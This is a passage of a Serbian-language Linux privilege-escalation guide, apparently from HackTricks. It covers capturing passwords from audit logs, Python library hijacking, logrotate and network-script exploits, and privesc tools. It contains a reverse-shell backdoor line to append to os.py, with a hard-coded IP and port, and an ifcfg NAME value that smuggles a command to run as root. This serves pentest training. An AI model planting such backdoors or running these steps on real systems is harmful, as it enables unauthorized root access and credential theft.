Takođe, neke **bad** konfigurisane (backdoored?) **audit logs** mogu vam dozvoliti da **zabeležite lozinke** unutar audit logs kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste čitali logove, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe treba proveriti fajlove koji sadrže reč "**password**" u svom **imenu** ili unutar **sadržaja**, kao i proveriti IP adrese i email-ove u logovima, ili regexp-e za hash-e.\
Neću ovde navoditi kako se sve to radi, ali ako te zanima možeš pogledati poslednje provere koje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) izvršava.

## Writable files

### Python library hijacking

Ako znaš **odakle** će se python skripta izvršavati i **možeš pisati u** taj folder ili možeš **modifikovati python biblioteke**, možeš izmeniti biblioteku os i ubaciti backdoor (ako možeš pisati mesto gde će se python skripta izvršavati, kopiraj i nalepi os.py biblioteku).

Da **ubaciš backdoor u biblioteku** jednostavno dodaj na kraj os.py biblioteke sledeću liniju (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Ranljivost u `logrotate`-u omogućava korisnicima sa **dozvolom za pisanje** na fajlu loga ili njegovim roditeljskim direktorijumima da potencijalno dobiju povišene privilegije. To je zato što `logrotate`, koji često radi kao **root**, može biti manipulisan da izvršava proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permisije ne samo u _/var/log_ već i u bilo kom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verzije `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete iskoristiti pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** tako da kad god otkrijete da možete menjati logove, proverite ko ih upravlja i proverite da li možete eskalirati privilegije zamenjujući logove symlinkovima.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ako, iz bilo kog razloga, korisnik može da **upiše** `ifcf-<whatever>` skriptu u _/etc/sysconfig/network-scripts_ **ili** može **izmeniti** postojeću, onda je vaš **system is pwned**.

Network skripte, na primer _ifcg-eth0_, koriste se za mrežne konekcije. Izgledaju tačno kao .INI fajlovi. Međutim, one su \~sourced\~ na Linuxu od strane Network Manager (dispatcher.d).

U mom slučaju, atribut `NAME=` u ovim network skriptama se ne obrađuje ispravno. Ako imate **prazan razmak u imenu, sistem pokušava da izvrši deo posle praznog razmaka**. To znači da **sve nakon prvog praznog razmaka se izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Napomena: obrati pažnju na razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` sadrži **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Uključuje skripte za `start`, `stop`, `restart`, i ponekad `reload` servisa. One se mogu izvršavati direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

S druge strane, `/etc/init` je povezan sa **Upstart**, novijim sistemom za **upravljanje servisima** koji je uveo Ubuntu, i koristi konfiguracione fajlove za zadatke upravljanja servisima. Uprkos prelazu na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog kompatibilnog sloja u Upstartu.

**systemd** se pojavljuje kao moderan init i menadžer servisa, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount tačkama i snimci stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za pakete distribucije i u `/etc/systemd/system/` za izmene administratora, pojednostavljujući proces administracije sistema.

## Ostali trikovi

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks često hook-uju syscall da bi izložili privilegovane kernel funkcionalnosti userspace manageru. Slaba autentifikacija managera (npr. provere potpisa zasnovane na FD-order ili loše šeme lozinki) može omogućiti lokalnoj aplikaciji da se predstavi kao manager i eskalira privilegije do root na uređajima koji su već root-ovani. Saznajte više i detalje eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel bezbednosne zaštite

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Više pomoći

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc alati

### **Najbolji alat za pronalaženje Linux lokalnih privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriše kernel ranjivosti na Linuxu i MAC-u [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fizički pristup):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kolekcija dodatnih skripti**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Reference

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
